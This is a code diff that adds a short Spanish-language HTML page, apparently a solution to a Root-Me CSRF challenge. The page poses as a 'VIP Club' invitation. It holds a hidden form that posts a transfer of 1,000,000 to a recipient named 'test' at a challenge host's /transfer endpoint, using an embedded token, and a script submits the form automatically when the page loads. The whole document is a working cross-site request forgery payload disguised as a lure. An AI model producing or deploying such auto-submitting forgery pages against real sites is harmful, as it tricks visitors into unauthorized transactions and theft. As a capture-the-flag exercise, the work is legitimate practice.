@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Oferta Exclusiva</title>
+</head>
+<body>
+    <h1>¡Has sido invitado al Club VIP!</h1>
+    <p>Cargando los beneficios...</p>
+
+    <form id="csrf-form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST">
+        <input type="hidden" name="token" value="698055634300bf0200000001" /> 
+        <input type="hidden" name="recipient" value="test" />
+        <input type="hidden" name="amount" value="1000000" />
+    </form>
+
+    <script>
+        // El script envía el formulario automáticamente en cuanto carga la página
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
